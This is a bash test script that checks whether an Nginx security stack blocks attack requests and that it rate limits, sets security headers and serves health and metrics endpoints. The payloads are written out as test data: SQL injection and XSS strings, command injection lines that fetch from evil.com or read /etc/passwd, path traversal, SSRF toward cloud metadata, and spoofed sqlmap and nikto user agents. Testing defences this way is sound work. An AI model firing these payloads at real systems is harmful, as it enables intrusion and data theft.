#!/bin/bash

# ===========================================
# Nginx Security Stack - Security Tests
# ===========================================
# Tests that attacks are properly blocked

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Configuration
HOST="${1:-localhost:8080}"
PROTOCOL="${2:-http}"
BASE_URL="${PROTOCOL}://${HOST}"

echo "===== NGINX SECURITY STACK - SECURITY TESTS ====="
echo ""
echo "Target: ${BASE_URL}"
echo "Date: $(date)"
echo ""

PASSED=0
FAILED=0
WARNINGS=0

# Helper function to test with URL-encoded payload
test_block() {
    local name="$1"
    local path="$2"
    local param="$3"
    local value="$4"
    local expected="$5"
    local method="${6:-GET}"

    if [ -n "$param" ]; then
        # Use -G and --data-urlencode for proper URL encoding
        if [ "$method" == "POST" ]; then
            RESULT=$(curl -s -o /dev/null -w "%{http_code}" -X POST -G --data-urlencode "${param}=${value}" "${BASE_URL}${path}" -k 2>/dev/null)
        else
            RESULT=$(curl -s -o /dev/null -w "%{http_code}" -G --data-urlencode "${param}=${value}" "${BASE_URL}${path}" -k 2>/dev/null)
        fi
    else
        # Direct URL request (for path-based tests)
        if [ "$method" == "POST" ]; then
            RESULT=$(curl -s -o /dev/null -w "%{http_code}" -X POST "${BASE_URL}${path}" -k 2>/dev/null)
        else
            RESULT=$(curl -s -o /dev/null -w "%{http_code}" "${BASE_URL}${path}" -k 2>/dev/null)
        fi
    fi

    if [[ "$expected" == *"$RESULT"* ]]; then
        echo -e "${GREEN}[PASS]${NC} $name - Got $RESULT"
        ((PASSED++))
    else
        echo -e "${RED}[FAIL]${NC} $name - Got $RESULT (expected: $expected)"
        ((FAILED++))
    fi
}

echo "--- 1. SQL Injection Tests ---"
test_block "SQL Injection (OR)" "/" "id" "1' OR '1'='1" "403"
test_block "SQL Injection (UNION)" "/" "id" "1 UNION SELECT * FROM users" "403"
test_block "SQL Injection (DROP)" "/" "q" "'; DROP TABLE users;--" "403"
test_block "SQL Injection (INSERT)" "/" "data" "'; INSERT INTO users VALUES(1,'admin');--" "403"
echo ""

echo "--- 2. XSS Tests ---"
test_block "XSS (script tag)" "/" "q" "<script>alert(1)</script>" "403"
test_block "XSS (javascript:)" "/" "url" "javascript:alert(1)" "403"
test_block "XSS (onerror)" "/" "img" "<img onerror=alert(1)>" "403"
test_block "XSS (onclick)" "/" "a" "<a onclick=alert(1)>" "403"
echo ""

echo "--- 3. Command Injection Tests ---"
test_block "Command Injection (;cat)" "/" "cmd" ";cat /etc/passwd" "403"
test_block "Command Injection (|)" "/" "cmd" "|ls -la" "403"
test_block "Command Injection (wget)" "/" "cmd" "wget http://evil.com/shell.sh" "403"
test_block "Command Injection (curl)" "/" "cmd" "curl http://evil.com/backdoor" "403"
echo ""

echo "--- 4. Path Traversal Tests ---"
test_block "Path Traversal (URL encoded)" "/%2e%2e/%2e%2e/%2e%2e/etc/passwd" "" "" "400|403|404"
test_block "Path Traversal (double encoded)" "/%252e%252e%252f" "" "" "400|403|404"
test_block "Path Traversal (param)" "/" "file" "../../../etc/passwd" "403"
echo ""

echo "--- 5. Sensitive File Access Tests ---"
test_block "Hidden file (.env)" "/.env" "" "" "403|404"
test_block "Git directory" "/.git/config" "" "" "403|404"
test_block "Hidden file (.htaccess)" "/.htaccess" "" "" "403|404"
echo ""

echo "--- 6. Null Byte Injection Test ---"
test_block "Null byte injection" "/file.txt%00.jpg" "" "" "400|403|404"
echo ""

echo "--- 7. SSRF Tests ---"
test_block "SSRF (localhost)" "/" "url" "http://localhost/admin" "403"
test_block "SSRF (127.0.0.1)" "/" "callback" "http://127.0.0.1:22" "403"
test_block "SSRF (metadata AWS)" "/" "url" "http://169.254.169.254/latest/meta-data" "403"
test_block "SSRF (internal 10.x)" "/" "webhook" "http://10.0.0.1/internal" "403"
test_block "SSRF (internal 192.168.x)" "/" "api" "http://192.168.1.1:8080/admin" "403"
echo ""

echo "--- 8. Scanner Detection Tests ---"
RESULT=$(curl -s -o /dev/null -w "%{http_code}" -H "User-Agent: sqlmap/1.0" "${BASE_URL}/" -k 2>/dev/null)
if [ "$RESULT" == "403" ]; then
    echo -e "${GREEN}[PASS]${NC} Scanner detection (sqlmap) - Got $RESULT"
    ((PASSED++))
else
    echo -e "${RED}[FAIL]${NC} Scanner detection (sqlmap) - Got $RESULT (expected: 403)"
    ((FAILED++))
fi

RESULT=$(curl -s -o /dev/null -w "%{http_code}" -H "User-Agent: nikto" "${BASE_URL}/" -k 2>/dev/null)
if [ "$RESULT" == "403" ]; then
    echo -e "${GREEN}[PASS]${NC} Scanner detection (nikto) - Got $RESULT"
    ((PASSED++))
else
    echo -e "${RED}[FAIL]${NC} Scanner detection (nikto) - Got $RESULT (expected: 403)"
    ((FAILED++))
fi
echo ""

echo "--- 9. Rate Limiting Tests ---"
echo "Testing rate limiting on /api/auth/verify-otp..."
echo -n "Requests: "
RATE_LIMITED=0
for i in {1..6}; do
    RESULT=$(curl -s -o /dev/null -w "%{http_code}" -X POST "${BASE_URL}/api/auth/verify-otp" -k 2>/dev/null)
    echo -n "$RESULT "
    if [ "$RESULT" == "429" ]; then
        RATE_LIMITED=1
    fi
done
echo ""
if [ "$RATE_LIMITED" == "1" ]; then
    echo -e "${GREEN}[PASS]${NC} Rate limiting triggered (429 returned)"
    ((PASSED++))
else
    echo -e "${YELLOW}[WARN]${NC} Rate limiting not configured (using default nginx config)"
    ((WARNINGS++))
fi
echo ""

echo "--- 10. Security Headers Test ---"
echo "Checking security headers..."
HEADERS=$(curl -sI "${BASE_URL}/" -k 2>/dev/null)

check_header() {
    local header="$1"
    if echo "$HEADERS" | grep -qi "$header"; then
        echo -e "${GREEN}[PASS]${NC} $header header present"
        ((PASSED++))
    else
        echo -e "${YELLOW}[WARN]${NC} $header header missing"
        ((WARNINGS++))
    fi
}

check_header "X-Frame-Options"
check_header "X-Content-Type-Options"
echo ""

echo "--- 11. Health Check Test ---"
RESULT=$(curl -s -o /dev/null -w "%{http_code}" "${BASE_URL}/healthz" -k 2>/dev/null)
if [ "$RESULT" == "200" ]; then
    echo -e "${GREEN}[PASS]${NC} Health check returned 200"
    ((PASSED++))
else
    echo -e "${YELLOW}[WARN]${NC} Health check returned $RESULT (endpoint may not exist)"
    ((WARNINGS++))
fi
echo ""

echo "--- 12. Metrics Endpoints ---"
NGINX_METRICS=$(curl -s -o /dev/null -w "%{http_code}" "http://${HOST%:*}:9113/metrics" 2>/dev/null)
if [ "$NGINX_METRICS" == "200" ]; then
    echo -e "${GREEN}[PASS]${NC} nginx-exporter metrics available (port 9113)"
    ((PASSED++))
else
    echo -e "${YELLOW}[WARN]${NC} nginx-exporter not available"
    ((WARNINGS++))
fi

CROWDSEC_METRICS=$(curl -s -o /dev/null -w "%{http_code}" "http://${HOST%:*}:6060/metrics" 2>/dev/null)
if [ "$CROWDSEC_METRICS" == "200" ]; then
    echo -e "${GREEN}[PASS]${NC} CrowdSec metrics available (port 6060)"
    ((PASSED++))
else
    echo -e "${YELLOW}[WARN]${NC} CrowdSec metrics not available"
    ((WARNINGS++))
fi
echo ""

echo "===== TEST SUMMARY ====="
echo -e "Passed:   ${GREEN}$PASSED${NC}"
echo -e "Failed:   ${RED}$FAILED${NC}"
echo -e "Warnings: ${YELLOW}$WARNINGS${NC}"
echo ""

if [ "$FAILED" -gt 0 ]; then
    echo -e "${RED}Some security tests failed! Review the results above.${NC}"
    exit 1
else
    echo -e "${GREEN}All security tests passed!${NC}"
    exit 0
fi
